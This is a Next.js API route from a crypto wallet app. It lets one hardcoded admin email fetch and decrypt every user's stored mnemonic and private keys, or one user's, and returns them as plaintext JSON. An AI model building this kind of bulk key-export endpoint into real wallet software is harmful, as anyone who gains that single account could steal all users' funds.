import { NextResponse } from "next/server";
import connectToDatabase from "@/lib/mongodb";
import { Wallet } from "@/models/Wallet";
import { User } from "@/models/User";
import { extractUserIdFromAuthHeader } from "@/lib/auth";
import { decryptKey } from "@/lib/encryption";

const ADMIN_EMAIL = "harshchhatbar@gmail.com";

export async function GET(req: Request) {
  try {
    await connectToDatabase();

    const authHeader = req.headers.get("authorization");
    const userId = extractUserIdFromAuthHeader(authHeader);

    if (!userId) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    // Verify if the user is the admin
    const user = await User.findById(userId);
    if (!user || user.email.toLowerCase() !== ADMIN_EMAIL.toLowerCase()) {
      return NextResponse.json({ error: "Forbidden: Only admin can access this API" }, { status: 403 });
    }

    // Fetch all wallets or a specific one if passed via query param
    const { searchParams } = new URL(req.url);
    const targetUserId = searchParams.get("userId");
    
    let query = {};
    if (targetUserId) {
      query = { userId: targetUserId };
    }

    const wallets = await Wallet.find(query).lean();

    // Decrypt keys for the admin
    const decryptedWallets = wallets.map((wallet: any) => ({
      _id: wallet._id,
      userId: wallet.userId,
      mnemonic: wallet.mnemonic === encryptKey("IMPORTED") ? "IMPORTED" : decryptKey(wallet.mnemonic),
      wallets: wallet.wallets.map((w: any) => ({
        networkFamily: w.networkFamily,
        address: w.address,
        privateKey: decryptKey(w.privateKey),
      }))
    }));

    return NextResponse.json({
      message: "Keys retrieved successfully",
      data: decryptedWallets,
    });

  } catch (error: any) {
    console.error(error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}

// Needed to check if something equals the encrypted "IMPORTED" tag
import { encryptKey } from "@/lib/encryption";
